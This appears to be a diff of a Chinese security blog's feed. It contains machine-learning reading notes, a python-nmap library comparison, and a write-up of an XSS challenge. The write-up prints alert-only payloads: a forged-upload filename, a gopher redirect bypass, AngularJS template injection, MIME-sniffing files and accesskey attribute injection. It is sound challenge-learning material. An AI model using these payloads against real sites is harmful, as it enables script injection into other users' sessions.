+&lt;h3 id=&quot;计算复杂度&quot;&gt;&lt;a href=&quot;#计算复杂度&quot; class=&quot;headerlink&quot; title=&quot;计算复杂度&quot;&gt;&lt;/a&gt;计算复杂度&lt;/h3&gt;&lt;p&gt;对于所有的网络而言，计算复杂度由前馈和反馈的复杂度O(W)主导，这意味着双向结构并不会显著增加计算的复杂度。&lt;/p&gt;
+&lt;h3 id=&quot;上下文范围&quot;&gt;&lt;a href=&quot;#上下文范围&quot; class=&quot;headerlink&quot; title=&quot;上下文范围&quot;&gt;&lt;/a&gt;上下文范围&lt;/h3&gt;&lt;p&gt;只有双向网络能够获取到被分类结构的完整上下文。对于多层感知器而言，上下文的范围取决于时间窗的大小。没有时间窗的多层感知器只具有没有上下文信息的基本能力。但是，在预处理器中的一些结构隐含着上下文信息。&lt;/p&gt;
+&lt;h3 id=&quot;输出层&quot;&gt;&lt;a href=&quot;#输出层&quot; class=&quot;headerlink&quot; title=&quot;输出层&quot;&gt;&lt;/a&gt;输出层&lt;/h3&gt;&lt;p&gt;对于输出层，我们使用交叉熵误差函数和softmax激活函数。softmax确保了网络输出在0到1之间，每一个步长的总和都是1。这意味着它们可以被视为给定范围内音素的后验概率。我们有许多误差函数可以使用，但是根据当前音位的持续时间来测量误差，确保短音素和长音素一样重要，对连续语音识别的改进有积极的意义。&lt;/p&gt;
+&lt;h2 id=&quot;0x04-网络训练&quot;&gt;&lt;a href=&quot;#0x04-网络训练&quot; class=&quot;headerlink&quot; title=&quot;0x04 网络训练&quot;&gt;&lt;/a&gt;0x04 网络训练&lt;/h2&gt;&lt;p&gt;对于所有网络，我们使用BPTT来计算每一段话的全误差梯度，使用在线最速下降来训练权重。所有实验使用同样的训练参数。&lt;/p&gt;
+&lt;h3 id=&quot;迭代再训练&quot;&gt;&lt;a href=&quot;#迭代再训练&quot; class=&quot;headerlink&quot; title=&quot;迭代再训练&quot;&gt;&lt;/a&gt;迭代再训练&lt;/h3&gt;&lt;p&gt;对于不同时间窗或目标延迟的实验，我们迭代地重新训练网络，而不是从头开始。为了找到最好的神经网络，我们在每个迭代中重新训练了LSTM网络5个周期，10轮RNN和20轮多层感知器。当然，更长的再训练时间将有可能带来更好的效果。对于多层感知器的再训练，需要加入额外的输入层权重，这是因为输入大小随着时间窗而变化。&lt;/p&gt;
+&lt;p&gt;虽然迭代训练是为了节省时间，但是我们发现迭代训练提升了最终的效果。这有可能是因为逃离了梯度下降算法容易进入的那些局部极小值。&lt;/p&gt;
+&lt;p&gt;神经网络从这种迭代训练中获益的能力涉及到神经网络和普通机器学习文献中广泛研究的不同任务之间的知识转移问题。&lt;/p&gt;
+&lt;h2 id=&quot;0x05-结果&quot;&gt;&lt;a href=&quot;#0x05-结果&quot; class=&quot;headerlink&quot; title=&quot;0x05 结果&quot;&gt;&lt;/a&gt;0x05 结果&lt;/h2&gt;&lt;p&gt;不同算法之间最明显的区别是训练轮数的不同。其中BRNN的收敛时间开销是BLSTM的8倍以上，尽管每个步长上的速度不是那么均匀。同样的收敛规律也表现在单向的LSTM和RNN上，多层感知器的速度仍然较慢。一种合理的解释是多层感知器和RNN需要对权重进行更多的微调才能访问到较远的上下文信息。&lt;/p&gt;
+&lt;p&gt;除了速度更快之外，LSTM也稍微准确一些。当然，BLSTM和BRNN之间的准确率差距相当小。差异不大的原因可能是这个训练任务还没有很明显的长程依赖关系。&lt;/p&gt;
+&lt;p&gt;有趣的是LSTM比RNN更容易过拟合，对于LSTM而言。15到20轮训练后，验证集和测试集的性能将开始下降，而训练集性能继续上升。而RNN并没有观察到测试集性能的大幅下降。这也可能由于数据集的特征使得LSTM比RNN更好的识别了一些长程的规律。如果真实这样，希望LSTM在其他数据集上不会表现出这种劣势。&lt;/p&gt;
+&lt;h3 id=&quot;前人的研究&quot;&gt;&lt;a href=&quot;#前人的研究&quot; class=&quot;headerlink&quot; title=&quot;前人的研究&quot;&gt;&lt;/a&gt;前人的研究&lt;/h3&gt;&lt;p&gt;一般来说，神经网络由于训练细节、训练数据的不同，很难与前人在同一问题上的研究作比较。&lt;/p&gt;
+&lt;h3 id=&quot;增加上下文的影响&quot;&gt;&lt;a href=&quot;#增加上下文的影响&quot; class=&quot;headerlink&quot; title=&quot;增加上下文的影响&quot;&gt;&lt;/a&gt;增加上下文的影响&lt;/h3&gt;&lt;p&gt;从实验中可以看出访问更大范围的上下文往往具有更好的结果。因此，双向网络会比单向网络要有普遍更好的表现；对于单向网络，LSTM比RNN从更长的时延中获益更多。这可能由于LSTM的记忆性，可以利用额外的上下文而不必在整个时延中存储以前的输入。&lt;/p&gt;
+&lt;p&gt;对于多层感知器，性能会随着时间窗的增加而增加，然而，更大的时间窗一味着更多权重的输入，这使得训练将会非常缓慢。&lt;/p&gt;
+&lt;h3 id=&quot;加权误差&quot;&gt;&lt;a href=&quot;#加权误差&quot; class=&quot;headerlink&quot; title=&quot;加权误差&quot;&gt;&lt;/a&gt;加权误差&lt;/h3&gt;&lt;p&gt;实验采用加权误差函数，会对BLSTM的帧性能带来影响，但是，误差加权是为了提升对整体音素的识别，而不是帧分类。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;希望论文能审过~&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="读书笔记" scheme="http://phantom0301.cc/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="机器学习" scheme="http://phantom0301.cc/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
+    
+      <category term="神经网络" scheme="http://phantom0301.cc/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
+    
+      <category term="读书笔记" scheme="http://phantom0301.cc/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>阿里XSS挑战赛思路及PoC</title>
+    <link href="http://phantom0301.cc/2017/08/30/alixss/"/>
+    <id>http://phantom0301.cc/2017/08/30/alixss/</id>
+    <published>2017-08-30T02:51:03.000Z</published>
+    <updated>2017-09-01T09:20:24.032Z</updated>
+    
+    <content type="html">&lt;p&gt;先知社区的XSS挑战，不只是过滤的绕过，还需要结合很多浏览器、HTML、CSS、JS的知识点，最后也只做出来9道题~~离2000的ECS还差那么一点点&lt;br&gt;_(:з」∠)_&lt;/p&gt;
+&lt;p&gt;完整writeup可以查看先知社区，博客里主要记录我的一些解题思路。&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h2 id=&quot;0x01-文件上传&quot;&gt;&lt;a href=&quot;#0x01-文件上传&quot; class=&quot;headerlink&quot; title=&quot;0x01 文件上传&quot;&gt;&lt;/a&gt;0x01 文件上传&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://phantom0301.cc/achiveimg/20170830105920.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;查看源代码可以得知，这里的触发点在文件名&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$_FILES[&amp;quot;fileToUpload&amp;quot;][&amp;quot;name&amp;quot;])
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;自测的情况下通过抓包修改可以成功弹窗，这道题的难点在于如何把一个self xss变成可以攻击的向量。&lt;/p&gt;
+&lt;p&gt;当时首先想到了通过中间服务器POST表单进行提交，但是如何在表单中构造文件就成了问题。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;input type=&amp;apos;file&amp;apos;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;作为安全策略，input标签中的文件类型在定义时会生成一个文件对象，而服务端是没有权限来控制这个文件对象的，当然flash是否能够完成对文件对象的控制这里没有尝试，暂时存疑。&lt;/p&gt;
+&lt;p&gt;无法控制文件对象，那么是否能够通过POST数据来构造一个文件提交呢？&lt;/p&gt;
+&lt;p&gt;这里又有问题，text型的PSOT数据无法更改文件上传时http头中的boundary,最终还是在先知社区找到了解决方法。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://xianzhi.aliyun.com/forum/read/224.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://xianzhi.aliyun.com/forum/read/224.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;通过&amp;lt;textarea&amp;gt;字段可以伪造文件上传。&lt;/p&gt;
+&lt;p&gt;在中间服务器上构造form表单，包含&amp;lt;textarea&amp;gt;字段，再使用js自动表单提交。核心代码是这一句&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;textarea id=&amp;quot;fileToUpload&amp;quot; name=&amp;apos;fileToUpload&amp;quot;; filename=&amp;quot;&amp;lt;img src=x onerror=alert(1)&amp;gt;121111.gif&amp;apos;&amp;gt;GIF89a hacked.gif&amp;lt;/textarea&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里还有两个点，一个是textarea没有filename字段，所以我们通过闭合引号来伪造，但是firefox和chrome会对双引号进行转义，因此这种方式只能在IE11下成功。另一个点是上传文件进行了文件类型的检测，这里面最容易构造的是gif文件。&lt;/p&gt;
+&lt;h2 id=&quot;0x04-referrer&quot;&gt;&lt;a href=&quot;#0x04-referrer&quot; class=&quot;headerlink&quot; title=&quot;0x04 referrer&quot;&gt;&lt;/a&gt;0x04 referrer&lt;/h2&gt;&lt;p&gt;触发点在 &lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$_SERVER[&amp;apos;HTTP_REFERER&amp;apos;]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以需要中间页面来跳转，关于携带refer的跳转方式可以参考这篇博客&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://wps2015.org/2016/06/27/unusual-xss/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://wps2015.org/2016/06/27/unusual-xss/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;这里的问题在于传递后中间refer会被firefox和chrome编码，所以只在win7的IE11中测试成功了。&lt;/p&gt;
+&lt;p&gt;后来有大牛提到这里可以使用flash做跳转，就可以支持win10的IE，经过测试确实有效。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://phantom0301.cc/achiveimg/20170830174512.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x05-跳转&quot;&gt;&lt;a href=&quot;#0x05-跳转&quot; class=&quot;headerlink&quot; title=&quot;0x05 跳转&quot;&gt;&lt;/a&gt;0x05 跳转&lt;/h2&gt;&lt;p&gt;这道题使用&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;header(&amp;quot;Location: &amp;quot;.$url);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;进行跳转，只有跳转失败，才会执行到触发点上，所以关键问题是如何跳转失败。&lt;/p&gt;
+&lt;p&gt;这个点过滤了crlf，因此我当时想只能从协议下手，很自然的想到之前被提的较多的gopher协议，所以直接进行测试。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss5.php?url=gopher://&amp;apos;&amp;gt;&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;&amp;lt;&amp;apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现没有跳转，能够进入触发点，接下来就是构造传统的payload了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://phantom0301.cc/achiveimg/20170830202319.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;分析这个点之所以这样，个人猜测是非http协议浏览器在进行执行时策略不同，不一定都是跳转，有的可能是弹框，比如FTP，有的可能是加载相关插件，比如迅雷的下载协议等。&lt;/p&gt;
+&lt;h2 id=&quot;0x06-强制下载&quot;&gt;&lt;a href=&quot;#0x06-强制下载&quot; class=&quot;headerlink&quot; title=&quot;0x06 强制下载&quot;&gt;&lt;/a&gt;0x06 强制下载&lt;/h2&gt;&lt;p&gt;和上一题类似，关键点在于不能让&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;header(&amp;apos;Content-Disposition: attachment; filename=&amp;quot;&amp;apos;.$_GET[&amp;quot;filename&amp;quot;].&amp;apos;&amp;quot;&amp;apos;);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行成功，这里我使用%00%0a进行绕过，还可以通过fuzz去发现更多的bypass手段。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;filename=%00%0a1.php&amp;amp;url=http://phantom0301.cc/alixss2.html
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;绕过后就可以执行到触发点，触发XSS。&lt;/p&gt;
+&lt;h2 id=&quot;0x07-text-plain&quot;&gt;&lt;a href=&quot;#0x07-text-plain&quot; class=&quot;headerlink&quot; title=&quot;0x07 text/plain&quot;&gt;&lt;/a&gt;0x07 text/plain&lt;/h2&gt;&lt;p&gt;这道题有些迷，题目本身通过设置text/plain强制输出文本，我们可以用MIME Sniffing去绕过，我构造了一个iso文件，文件中写入paylaod，在兼容模式下的IE11中可以触发，而小伙伴另一个版本的IE11可以无条件触发。由于需要兼容模式的先决条件，所以这道题当时并不算通过。在这里就不多说了，等待官方writeup。&lt;/p&gt;
+&lt;h2 id=&quot;0x10-MVM&quot;&gt;&lt;a href=&quot;#0x10-MVM&quot; class=&quot;headerlink&quot; title=&quot;0x10 MVM&quot;&gt;&lt;/a&gt;0x10 MVM&lt;/h2&gt;&lt;p&gt;考察的点是angularJS的模板注入，在两个花括号中angular会解析支持的操作。&lt;/p&gt;
+&lt;p&gt;网上关于这个点给出的paylaod是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;\{\{constructor.constructor(&amp;apos;alert()&amp;apos;)()\}\}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一共40个字符（忽视我用来转义的斜杠），为什么要数字符数呢？因为这道题的难点在于限制字符只能小于36个。&lt;/p&gt;
+&lt;p&gt;对于懂angularJS的同学，这道题可能要简单很多，我之前有研究过python的Jinja模板注入，其实两者有很多相似之处。这个点无非是要通过constructor.constructor得到一个匿名函数类型，进而执行弹窗操作，那么突破点就是如何能够构造一个尽可能短的匿名函数类型。&lt;/p&gt;
+&lt;p&gt;首先，我们要先得到一个JS的变量，为下一步用构造函数得到底层的类型做准备，作为前端小白，只能对照angularJS的手册，一个个尝试，我先后尝试了’’，1，()，[]等多个数据结构，最后找到了如下paylaod&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;\{\{&amp;apos;&amp;apos;.sub.constructor(&amp;apos;alert()&amp;apos;)()\}\}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;刚刚好~~&lt;/p&gt;
+&lt;h2 id=&quot;0x12-preview&quot;&gt;&lt;a href=&quot;#0x12-preview&quot; class=&quot;headerlink&quot; title=&quot;0x12 preview&quot;&gt;&lt;/a&gt;0x12 preview&lt;/h2&gt;&lt;p&gt;还是一个利用MIME Sniffing来完成的题。&lt;/p&gt;
+&lt;p&gt;题目请求url后，需要请求的资源符合所规定的MIME类型，利用这里构造后缀名、文件标识与Content-Type不符合的文件进行请求，在IE11下能够成功弹窗。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss12.php?url=http://phantom0301.cc/img/1.avi
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中1.avi的内容如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
+&amp;lt;img src=x onerror=alert(1)&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x13-REQUEST-URI&quot;&gt;&lt;a href=&quot;#0x13-REQUEST-URI&quot; class=&quot;headerlink&quot; title=&quot;0x13 REQUEST_URI&quot;&gt;&lt;/a&gt;0x13 REQUEST_URI&lt;/h2&gt;&lt;p&gt;出发点如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo &amp;quot;REQUEST_URI:&amp;quot;.$_SERVER[&amp;apos;REQUEST_URI&amp;apos;];
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这道题上上面的一道题类似，通过GET变量添加的方式在php文件后面携带paylaod&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;xss13.php?&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x14-Hidden&quot;&gt;&lt;a href=&quot;#0x14-Hidden&quot; class=&quot;headerlink&quot; title=&quot;0x14 Hidden&quot;&gt;&lt;/a&gt;0x14 Hidden&lt;/h2&gt;&lt;p&gt;难点在于input标签是hidden的，因此一些on的事件无法成功触发，同时使用htmlspecialchars过滤标签。&lt;/p&gt;
+&lt;p&gt;这个在网上可以找到很多类似的讨论，不用再这里细说。&lt;/p&gt;
+&lt;p&gt;首先使用单引号闭合前一属性，增加accesskey标签，使用onclick标签，这样在firefox下使用Ctrl+Shift+accesskey标签值得组合就可以触发onclick事件。&lt;/p&gt;
+&lt;p&gt;完整payload如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;apos; accesskey=X onclick=&amp;apos;alert(document.domain)
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x16-PHP-SELF&quot;&gt;&lt;a href=&quot;#0x16-PHP-SELF&quot; class=&quot;headerlink&quot; title=&quot;0x16 PHP_SELF&quot;&gt;&lt;/a&gt;0x16 PHP_SELF&lt;/h2&gt;&lt;p&gt;RPO attack&lt;/p&gt;
+&lt;p&gt;将payload利用绝对路径/相对路径的方式写入CSS文件中，利用IE的CSS样式XSS方法触发弹框，我这里只找到了IE7 IE6成功执行的payload。&lt;/p&gt;
+&lt;h2 id=&quot;0x17-passive-element&quot;&gt;&lt;a href=&quot;#0x17-passive-element&quot; class=&quot;headerlink&quot; title=&quot;0x17 passive element&quot;&gt;&lt;/a&gt;0x17 passive element&lt;/h2&gt;&lt;p&gt;div标签中过滤尖括号，同样有很多种绕过手法，我这里使用了和Hideen那道题一样的触发思路：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;apos; accesskey=X  onclick=alert(1) id=&amp;apos;xss
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在需要快捷键的情况下触发成功。&lt;/p&gt;
+&lt;h2 id=&quot;小结&quot;&gt;&lt;a href=&quot;#小结&quot; class=&quot;headerlink&quot; title=&quot;小结&quot;&gt;&lt;/a&gt;小结&lt;/h2&gt;&lt;p&gt;真正完成9道题，实现了11道题的弹框。里面大多数题都需要自己去不断尝试，前前后后做了5天左右的样子，头脑风暴的感觉很好，而且几道没有做出来的题都有进一步fuzz测试的思路，可以对XSS整体有了更进一步的了解，而且包括浏览器差异、特殊字符差异等问题也值得去研究探索。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;先知社区的XSS挑战，不只是过滤的绕过，还需要结合很多浏览器、HTML、CSS、JS的知识点，最后也只做出来9道题~~离2000的ECS还差那么一点点&lt;br&gt;_(:з」∠)_&lt;/p&gt;
+&lt;p&gt;完整writeup可以查看先知社区，博客里主要记录我的一些解题思路。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="xss" scheme="http://phantom0301.cc/categories/xss/"/>
+    
+    
+      <category term="MIME" scheme="http://phantom0301.cc/tags/MIME/"/>
+    
+      <category term="RPO" scheme="http://phantom0301.cc/tags/RPO/"/>
+    
+      <category term="xss" scheme="http://phantom0301.cc/tags/xss/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python-nmap与python-libnmap对比</title>
+    <link href="http://phantom0301.cc/2017/08/17/nmapvslibnmap/"/>
+    <id>http://phantom0301.cc/2017/08/17/nmapvslibnmap/</id>
+    <published>2017-08-17T08:08:15.000Z</published>
+    <updated>2017-08-17T12:26:08.892Z</updated>
+    
+    <content type="html">&lt;p&gt;写一个小项目时的对比，项目地址：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/phantom0301/Cynops&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Cynops&lt;/a&gt;&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h2 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h2&gt;&lt;p&gt;写的练手项目中用到了python调用nmap的情景，对比使用了两款常见的python库&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;python-nmap&lt;/li&gt;
+&lt;li&gt;python-libnmap&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;两种库各有各的优点，可以考虑在不同的环境下使用。&lt;/p&gt;
+&lt;h2 id=&quot;0x02-源码分析&quot;&gt;&lt;a href=&quot;#0x02-源码分析&quot; class=&quot;headerlink&quot; title=&quot;0x02 源码分析&quot;&gt;&lt;/a&gt;0x02 源码分析&lt;/h2&gt;&lt;p&gt;首先，我们从源码的角度来分析两个库：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;py-nmap&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;它的代码统一写在一个单文件中，主要定义了三种扫描类、一个目标字典类和一个扫描错误类。&lt;/p&gt;
+&lt;p&gt;基础类PortScanner，该类主要提供扫描方法、扫描结果xml输出、扫描CSV结果的文本输出功能。&lt;/p&gt;
+&lt;p&gt;异步扫描类PortScannerAsync，该类主要提供异步扫描功能。&lt;/p&gt;
+&lt;p&gt;生成扫描类PortScannerYield提供一种作为生成器的扫描方式。&lt;/p&gt;
+&lt;p&gt;从源码可以看出，它主要就是通过python调用nmap进行扫描，并没有太多其他的实现，所有的nmap需求通过nmap自身的参数来实现。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;py-libnmap&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;相比之下，libnmap的函数实现就要复杂一些，它定义了包括对象、插件和基础功能在内的多个函数。&lt;/p&gt;
+&lt;p&gt;基础功能包process，主体类NmapProcess，在该类中，定义类包括扫描行为、输出结果、后台执行、sudo执行、执行时间状态等多种方法。&lt;/p&gt;
+&lt;p&gt;结果解析包Parser，能够对输出的文本结果进行多种来源格式的解析，但是在实际运行过程中会发现对于一些特殊的请求结果，解析效果不是很令人满意，而且用起来没有自己写解析器顺手。&lt;/p&gt;
+&lt;p&gt;对象模块负责定义各种不同的Nmap对象体&lt;/p&gt;
+&lt;p&gt;插件模块提供了数据库和后台的功能插件。&lt;/p&gt;
+&lt;p&gt;从这里看到libnmap的实现更加庞大，不只是单单调用nmap，还对nmap中的交互对象进行了类定义，从插件模块可以看出，该库还试图通过插件来不断丰富自己功能。&lt;/p&gt;
+&lt;h2 id=&quot;0x03-实际测试&quot;&gt;&lt;a href=&quot;#0x03-实际测试&quot; class=&quot;headerlink&quot; title=&quot;0x03 实际测试&quot;&gt;&lt;/a&gt;0x03 实际测试&lt;/h2&gt;&lt;p&gt;实际测试中，选取默认扫描、使用nse脚本扫描和traceroute扫描三种方式来比对它们的扫描的结果差异。统一用我的博客作为扫描目标。&lt;/p&gt;
+&lt;h4 id=&quot;默认扫描&quot;&gt;&lt;a href=&quot;#默认扫描&quot; class=&quot;headerlink&quot; title=&quot;默认扫描&quot;&gt;&lt;/a&gt;默认扫描&lt;/h4&gt;&lt;p&gt;直接调用扫描类，只提供目标IP，其他参数缺省。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;py-nmap&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -oX - -sV 123.207.68.169
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;这一条是该库调用Nmap时使用到的参数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://phantom0301.cc/achiveimg/20170817170158.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到结果是一个字典，提供扫描状态、扫描信息、扫描结果的查询。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;py-libnmap&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -oX - -vvv --stats-every 1s -sT 123.207.68.169
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;libnmap的默认扫描更加复杂。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://phantom0301.cc/achiveimg/20170817171922.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;默认能够获取到的是标准的文本格式Nmap xml结果，需要使用上面提到的Parser进行解析。&lt;/p&gt;
+&lt;h4 id=&quot;脚本调用&quot;&gt;&lt;a href=&quot;#脚本调用&quot; class=&quot;headerlink&quot; title=&quot;脚本调用&quot;&gt;&lt;/a&gt;脚本调用&lt;/h4&gt;&lt;p&gt;我们对特定的80端口使用http-enum，查看结果。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;py-nmap&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;apos;script&amp;apos;: {&amp;apos;http-enum&amp;apos;: &amp;apos;\n  /atom.xml: RSS or Atom feed\n  
+                    /test/: Test page\n  
+                    /test.html: Test page\n  
+                    /archives/: Potentially interesting folder\n  
+                    /css/: Potentially interesting folder\n  
+                    /images/: Potentially interesting folder\n
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;可以看到可以使用脚本的输出结果。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;py-libnmap，同时在这里使用Parser来解析结果。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;同样通过xml输出了脚本的结果，解析后的结果需要参照对象模块里不同的对象类来输出用户需要的结果，这里用起来觉得它的封装不是很清晰，不如py-nmap的结果更加友好。&lt;/p&gt;
+&lt;h4 id=&quot;traceroute&quot;&gt;&lt;a href=&quot;#traceroute&quot; class=&quot;headerlink&quot; title=&quot;traceroute&quot;&gt;&lt;/a&gt;traceroute&lt;/h4&gt;&lt;p&gt;这里分别再次用两个包执行nmap的traceroute对比结果，之所以单独测试了traceroute，是因为我的项目里用到了这项功能。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;py-nmap&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;在获取traceroute时，通过nm.analyse_nmap_xml_scan()是无法获取到跳转的结果，这时需要nm.get_nmap_last_output()来获取xml的结果。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;py-libnmap&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;由于lib的基本输出方式是输出xml，但是它的解析函数用起来也不方便，所以还是推荐自己编写解析器。&lt;/p&gt;
+&lt;h2 id=&quot;0x03-对比&quot;&gt;&lt;a href=&quot;#0x03-对比&quot; class=&quot;headerlink&quot; title=&quot;0x03 对比&quot;&gt;&lt;/a&gt;0x03 对比&lt;/h2&gt;&lt;p&gt;作为调用原理相同，甚至实现方法也相近的两个库，有一个最明显的区别就是py-nmap趋向于简洁，而py-libnmap趋向于功能完整。对于快捷的扫描，推荐使用nmap包，而对于拥有入库、高级对象封装等功能的项目则可以使用libnmap。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;写一个小项目时的对比，项目地址：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/phantom0301/Cynops&quot;&gt;Cynops&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="python" scheme="http://phantom0301.cc/categories/python/"/>
+    
+    
+      <category term="nmap" scheme="http://phantom0301.cc/tags/nmap/"/>
+    
+      <category term="python" scheme="http://phantom0301.cc/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>基于递归神经网络的监督序列标记（3）</title>
+    <link href="http://phantom0301.cc/2017/07/18/rnntolabel3/"/>
+    <id>http://phantom0301.cc/2017/07/18/rnntolabel3/</id>
+    <published>2017-07-18T13:14:15.000Z</published>
+    <updated>2017-08-14T13:35:27.704Z</updated>
+    
+    <content type="html">&lt;p&gt;负责的项目代码初版7月18日全部完成了，有时间继续补坑。然而之后又是出差，所以这篇一直拖到了8月14日才完成~&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h2 id=&quot;0x01-长短时记忆网络结构&quot;&gt;&lt;a href=&quot;#0x01-长短时记忆网络结构&quot; class=&quot;headerlink&quot; title=&quot;0x01 长短时记忆网络结构&quot;&gt;&lt;/a&gt;0x01 长短时记忆网络结构&lt;/h2&gt;&lt;p&gt;前面说过了循环神经网络的优点在于它们处理序列时的使用上下文的能力。但是，对于标准的循环神经网络来说，实际中能够利用的上下文范围是十分有限的。由于多重循环的关系，给定的输入在隐藏层中的影响要么减弱，要么指数式增加。这种影响叫做梯度消失。二十世纪九十年代曾经有很多尝试来解决这一问题。它们使用了非梯度的训练算法，比如模拟退火、离散误差传播、时间常数和层次序列压缩。而这里重点要说长短时记忆算法。&lt;/p&gt;
